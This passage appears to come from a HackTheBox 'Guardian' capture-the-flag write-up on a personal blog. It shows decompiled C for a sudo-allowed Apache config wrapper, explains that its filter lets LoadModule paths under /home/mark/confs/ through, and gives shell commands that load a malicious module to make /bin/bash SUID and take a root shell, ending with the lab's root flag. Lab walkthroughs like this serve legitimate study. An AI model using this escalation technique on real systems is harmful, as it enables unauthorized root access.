class="type">char</span> *pcVar3;</span><br><span class="line">  undefined7 extraout_var;</span><br><span class="line">  FILE *__stream;</span><br><span class="line">  undefined8 uVar4;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">char</span> local_1418 [<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> local_1018 [<span class="number">4104</span>];</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line"></span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">if</span> (param_1 == <span class="number">3</span>) &#123;</span><br><span class="line">    iVar2 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)param_2[<span class="number">1</span>],<span class="string">&quot;-f&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      pcVar3 = realpath((<span class="type">char</span> *)param_2[<span class="number">2</span>],local_1018);</span><br><span class="line">      <span class="keyword">if</span> (pcVar3 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;realpath&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        bVar1 = starts_with(local_1018,<span class="string">&quot;/home/mark/confs/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">int</span>)CONCAT71(extraout_var,bVar1) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Access denied: config must be inside %s\n&quot;</span>,<span class="string">&quot;/home/mark/confs/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          __stream = fopen(local_1018,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__stream == (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">              pcVar3 = fgets(local_1418,<span class="number">0x400</span>,__stream);</span><br><span class="line">              <span class="keyword">if</span> (pcVar3 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                fclose(__stream);</span><br><span class="line">                execl(<span class="string">&quot;/usr/sbin/apache2ctl&quot;</span>,<span class="string">&quot;apache2ctl&quot;</span>,&amp;DAT_00102072,local_1018,<span class="number">0</span>);</span><br><span class="line">                perror(<span class="string">&quot;execl failed&quot;</span>);</span><br><span class="line">                <span class="keyword">goto</span> LAB_00101663;</span><br><span class="line">              &#125;</span><br><span class="line">              uVar4 = is_unsafe_line(local_1418);</span><br><span class="line">            &#125; <span class="keyword">while</span> ((<span class="type">int</span>)uVar4 == <span class="number">0</span>);</span><br><span class="line">            fwrite(<span class="string">&quot;Blocked: Config includes unsafe directive.\n&quot;</span>,<span class="number">1</span>,<span class="number">0x2b</span>,<span class="built_in">stderr</span>);</span><br><span class="line">            fclose(__stream);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00101663;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Usage: %s -f /home/mark/confs/file.conf\n&quot;</span>,(<span class="type">char</span> *)*param_2);</span><br><span class="line">LAB_00101663:</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>There is a <code>is_unsafe_line</code> function, following up:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">is_unsafe_line</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-1030h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+1038h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;%31s %1023s&quot;</span>, s1, v3) != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;Include&quot;</span>) &amp;&amp; <span class="built_in">strcmp</span>(s1, <span class="string">&quot;IncludeOptional&quot;</span>) &amp;&amp; <span class="built_in">strcmp</span>(s1, <span class="string">&quot;LoadModule&quot;</span>)</span><br><span class="line">    || v3[<span class="number">0</span>] != <span class="number">47</span></span><br><span class="line">    || (<span class="type">unsigned</span> <span class="type">int</span>)starts_with(v3, <span class="string">&quot;/home/mark/confs/&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] Blocked: %s is outside of %s\n&quot;</span>, v3, <span class="string">&quot;/home/mark/confs/&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The binary prevents the following:</p>
+<ol>
+<li>The directive is <code>Include</code>, <code>IncludeOptional</code>, or <code>LoadModule</code></li>
+<li>The parameter is an absolute path (starting with <code>/</code>)</li>
+<li>And the path <strong>is not under <code>/home/mark/confs/</code></strong></li>
+</ol>
+<p>In other words, as long as the <code>LoadModule</code> parameter points inside <code>/home/mark/confs/</code>, it is considered safe. We exploit this by loading a malicious <code>.so</code> with <code>LoadModule</code> to get a root shell.</p>
+<p>We compile a malicious Apache module and load it:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mark@guardian:~$ cat &lt;&lt;EOF &gt; /home/mark/confs/exploit.conf</span><br><span class="line">LoadModule exploit_module /home/mark/confs/exp.so</span><br><span class="line">EOF</span><br><span class="line">mark@guardian:~$ gcc -shared -fPIC -o /home/mark/confs/exp.so /tmp/exp.c</span><br><span class="line">mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf</span><br><span class="line">apache2: Syntax error on line 1 of /home/mark/confs/exploit.conf: Can&#x27;t locate API module structure `exploit_module&#x27; in file /home/mark/confs/exp.so: /home/mark/confs/exp.so: undefined symbol: exploit_module</span><br><span class="line">Action &#x27;-f /home/mark/confs/exploit.conf&#x27; failed.</span><br><span class="line">The Apache error log may have more information.</span><br><span class="line">mark@guardian:~$ ls -al /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash</span><br><span class="line">mark@guardian:~$ bash -p</span><br><span class="line">bash-5.1# cat /root/root.txt</span><br><span class="line">4f3f22bc6ad4c3167fd4a807a7d462f4</span><br><span class="line">bash-5.1#</span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for Guardian, hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Guardian</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-02-28 22:36:54</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-02-28 22:39:21
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/02/28/Hackthebox-Guardian/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/IDOR/">#IDOR</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/XSS/">#XSS</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CSRF/">#CSRF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/LFI/">#LFI</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/PHP-Filter-Chains/">#PHP Filter Chains</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Apache-Module-Hijack/">#Apache Module Hijack</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/02/23/Hackthebox-Giveback/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Giveback</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Guardian</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Enumeration"><span class="nav-text">Web Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDOR-Chat-Feature"><span class="nav-text">IDOR - Chat Feature</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gitea-Source-Code-Review"><span class="nav-text">Gitea - Source Code Review</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-via-PhpSpreadsheet-GHSA-79xx-vf93-p7cx"><span class="nav-text">XSS via PhpSpreadsheet (GHSA-79xx-vf93-p7cx)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-Creating-an-Admin-Account"><span class="nav-text">CSRF - Creating an Admin Account</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LFI-via-PHP-Filter-Chains"><span class="nav-text">LFI via PHP Filter Chains</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lateral-Movement-Hash-Cracking"><span class="nav-text">Lateral Movement - Hash Cracking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-jamil-%E2%86%92-mark"><span class="nav-text">Privilege Escalation - jamil → mark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-mark-%E2%86%92-root"><span class="nav-text">Privilege Escalation - mark → root</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
